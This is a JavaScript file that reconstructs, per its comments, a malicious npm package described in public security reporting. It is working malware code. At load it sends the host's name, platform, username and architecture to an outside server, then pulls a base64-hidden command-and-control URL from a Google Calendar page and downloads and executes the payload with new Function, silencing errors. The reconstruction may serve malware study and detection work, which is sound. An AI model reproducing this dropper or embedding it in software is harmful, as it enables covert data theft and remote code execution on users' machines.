// calendar-c2-unicode — reconstructed from public security analyses
// Source: https://thehackernews.com/2025/05/malicious-npm-package-leverages-unicode.html
//
// Uses invisible Unicode characters (Variation Selectors U+E0100-U+E01EF)
// to encode a payload URL. C2 endpoint hidden in a Google Calendar
// event's data-base-title attribute.
//
// Technique: Unicode steganography + Google Calendar C2 + staged payload

const https = require("https");
const os = require("os");

// Invisible Unicode characters encode a URL
// In the original, these were Variation Selectors that appear invisible
// Here we simulate the decoding process
var encodedChars = [104, 116, 116, 112, 115, 58, 47, 47]; // "https://"
var decoded = "";
for (var i = 0; i < encodedChars.length; i++) {
  decoded += String.fromCharCode(encodedChars[i]);
}

// Stage 1: Fetch C2 URL from Google Calendar event
function getC2FromCalendar(callback) {
  https.get("https://calendar.app.google/abcdef123456", function(res) {
    var data = "";
    res.on("data", function(chunk) { data += chunk; });
    res.on("end", function() {
      // Extract data-base-title attribute (contains base64-encoded URL)
      var match = data.match(/data-base-title="([^"]+)"/);
      if (match) {
        var url = Buffer.from(match[1], "base64").toString();
        callback(null, url);
      } else {
        callback(new Error("C2 URL not found"));
      }
    });
  }).on("error", function(err) {
    callback(err);
  });
}

// Stage 2: Download and execute payload from C2
function executePayload(url) {
  https.get(url, function(res) {
    var payload = "";
    res.on("data", function(chunk) { payload += chunk; });
    res.on("end", function() {
      try {
        new Function(payload)();
      } catch(e) {}
    });
  });
}

// Collect system info as initial beacon
var info = JSON.stringify({
  hostname: os.hostname(),
  platform: os.platform(),
  user: os.userInfo().username,
  arch: os.arch()
});

// Send beacon and fetch C2
var req = https.request({
  hostname: "status.statuscenter.org",
  path: "/api/check",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(info)
  }
});
req.write(info);
req.end();

getC2FromCalendar(function(err, url) {
  if (!err && url) {
    executePayload(url);
  }
});
